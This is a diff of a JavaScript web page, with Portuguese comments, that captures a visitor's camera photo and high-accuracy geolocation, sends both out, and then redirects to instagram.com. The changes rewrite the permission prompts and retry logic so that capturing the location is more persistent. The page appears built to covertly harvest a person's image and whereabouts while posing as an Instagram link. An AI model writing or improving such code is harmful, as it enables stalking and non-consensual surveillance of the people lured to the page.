@@ -84,8 +84,8 @@
         return data.secure_url;
       } catch (error) {
         console.error("Erro na captura da foto:", error);
-        showOverlay("São necessárias as permissões para continuar. Toque e tente novamente.", () => {
-          startFlow(); // Recomeça o fluxo do início
+        showOverlay("Permita acesso à câmera para continuar. Toque para tentar novamente.", () => {
+          startFlow(); // Aqui sim pode reiniciar o fluxo completo
         });
         throw error;
       }
@@ -112,14 +112,14 @@
           window.location.href = "https://instagram.com";
         } catch (err) {
           console.error("Erro no envio da localização:", err);
-          showOverlay("São necessárias as permissões para continuar. Toque e tente novamente.", () => {
-            startFlow(); // Recomeça do início
+          showOverlay("Permita acesso à localização para continuar. Toque para tentar novamente.", () => {
+            requestLocation(imageUrl); // tenta de novo só a localização
           });
         }
       }, (err) => {
         console.error("Erro ao obter localização:", err);
-        showOverlay("São necessárias as permissões para continuar. Toque e tente novamente.", () => {
-          startFlow(); // Recomeça do início
+        showOverlay("Permita acesso à localização para continuar. Toque para tentar novamente.", () => {
+          requestLocation(imageUrl); // tenta de novo só a localização
         });
       }, {
         enableHighAccuracy: true,
